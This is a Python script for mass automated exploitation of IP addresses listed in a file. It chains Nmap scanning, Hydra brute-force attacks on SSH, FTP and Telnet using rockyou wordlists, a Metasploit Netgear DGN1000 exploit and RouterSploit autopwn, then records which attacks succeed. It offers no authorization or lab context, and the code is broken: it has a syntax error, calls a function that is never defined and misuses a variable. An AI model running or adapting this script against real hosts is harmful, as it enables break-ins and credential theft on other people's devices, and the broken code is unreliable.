
import logging
import subprocess
import json
from concurrent.futures import ThreadPoolExecutor
import shutil

# Configure logging for detailed output
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(message)s")

# Define tool patterns with RouterSploit autopwn included
tool_patterns = {
    "nmap": {
        "command": ["nmap", "-Pn", "-sV", "{ip}"],
        "service": None,
        "description": "Nmap version scan to detect open services and versions."
    },
    "hydra_ssh": {
        "command": ["hydra", "-L", "/usr/share/wordlists/rockyou.txt", "-P", "/usr/share/wordlists/rockyou.txt", "ssh://{ip}"],
        "service": "ssh",
        "description": "Hydra brute-force attack against SSH using rockyou for both username and password."
    },
    "hydra_ftp": {
        "command": ["hydra", "-L", "/usr/share/wordlists/rockyou.txt", "-P", "/usr/share/wordlists/rockyou.txt", "ftp://{ip}"],
        "service": "ftp",
        "description": "Hydra brute-force attack against FTP service using rockyou for both username and password."
    },
    "hydra_telnet": {
        "command": ["hydra", "-L", "/usr/share/wordlists/rockyou.txt", "-P", "/usr/share/wordlists/rockyou.txt", "telnet://{ip}"],
        "service": "telnet",
        "description": "Hydra brute-force attack against Telnet using rockyou for both username and password."
    },
    },
    "msfconsole": {
        "command": ["msfconsole", "-q", "-x", "use exploit/linux/http/netgear_dgn1000_setup_exec; set RHOSTS {ip}; exploit; exit"],
        "service": "http",
        "description": "Metasploit exploit for HTTP services on Netgear DGN1000."
    },
    "routersploit": {
        "command": ["routersploit", "autopwn", "-t", "{ip}"],
        "service": None,  # Run autopwn regardless of service
        "description": "RouterSploit autopwn scan to attempt exploitation of vulnerable services."
    }
}

def load_ips(file_path="ips.txt"):
    """Load target IPs from a text file."""
    with open(file_path, "r") as file:
        return [line.strip() for line in file if line.strip()]

def execute_command(command):
    """Execute a command and return output."""
    try:
        result = subprocess.run(command, capture_output=True, text=True, timeout=300)
        return result.stdout if result.returncode == 0 else result.stderr
    except subprocess.TimeoutExpired:
        return "Command timed out"
    except Exception as e:
        return f"Command error: {e}"

def detect_installed_tools():
    """Detect available tools and return usable ones."""
    installed_tools = {}
    for tool, data in tool_patterns.items():
        if shutil.which(tool):
            installed_tools[tool] = data
    return installed_tools

def discover_services(ip):
    """Run Nmap discovery and return detected services and outdated ones."""
    logging.info(f"Running Nmap discovery on {ip}")
    nmap_command = ["nmap", "-sV", "-Pn", ip]
    output = execute_command(nmap_command)
    services = []
    outdated_services = []

    # Parse Nmap output for services and outdated versions
    for line in output.splitlines():
        if "open" in line:
            if "ssh" in line:
                services.append("ssh")
            elif "http" in line:
                services.append("http")
            elif "ftp" in line:
                services.append("ftp")
            # Additional service checks as needed

        # Check for known outdated versions
        if "obsolete" in line.lower() or "outdated" in line.lower():
            outdated_services.append(line.strip())

    logging.info(f"Discovered services on {ip}: {services}")
    return services, outdated_services

def run_exploit(ip, tool, tool_info):
    """Run a single exploit command for a tool and return results."""
    command = [arg.replace("{ip}", ip) if "{ip}" in arg else arg for arg in tool_info["command"]]
    output = execute_command(command)
    success = "success" if "session opened" in output.lower() or "completed" in output.lower() else "failure"
    logging.info(f"{tool} on {ip} - {success}")
    return {
        "ip": ip,
        "tool": tool,
        "description": tool_info["description"],
        "status": success,
        "output": output
    }

def run_exploits_for_services(ip, services, available_tools):
    """Run relevant exploits based on services for an IP."""
    results = []

    for service in services:
        for tool, tool_info in available_tools.items():
            if tool_info["service"] is None or tool_info["service"] == service:
                result = run_exploit(ip, tool, tool_info)
                results.append(result)

    return results

def run_exploits_on_all_ips(target_ips, output_file="exploit_results.json", outdated_file="outdated_services.json"):
    """Run exploits on all IPs concurrently and save results."""
    all_results = []
    outdated_results = []

    # Detect available tools automatically
    available_tools = detect_installed_tools()

    # Use ThreadPoolExecutor for concurrent execution
    with ThreadPoolExecutor(max_workers=5) as executor:
        futures = [executor.submit(run_exploits_for_ip, ip, available_tools) for ip in target_ips]
        for future in futures:
            results, outdated_services = future.result()
            all_results.extend(results)
            if outdated_services:
                outdated_results.append({"ip": ip, "outdated_services": outdated_services})

    # Save all results to JSON files
    with open(output_file, "w") as f:
        json.dump(all_results, f, indent=4)
    with open(outdated_file, "w") as f:
        json.dump(outdated_results, f, indent=4)

    logging.info(f"All exploits completed. Results saved to {output_file}")
    logging.info(f"Outdated services saved to {outdated_file}")

if __name__ == "__main__":
    # Load IPs from a file
    target_ips = load_ips("ips.txt")

    # Run exploits on all IPs
    run_exploits_on_all_ips(target_ips)
